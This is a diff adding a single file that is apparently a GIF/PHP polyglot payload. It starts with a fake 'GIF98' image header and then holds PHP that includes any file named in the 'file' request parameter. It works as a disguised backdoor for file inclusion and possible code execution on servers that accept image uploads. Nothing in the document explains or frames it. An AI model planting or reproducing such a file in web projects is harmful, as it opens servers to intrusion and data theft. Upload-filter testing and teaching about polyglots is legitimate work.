@@ -1,0 +1,8 @@
+
+GIF98
+ 
+<?php
+
+  include $_GET["file"];
+
+?>
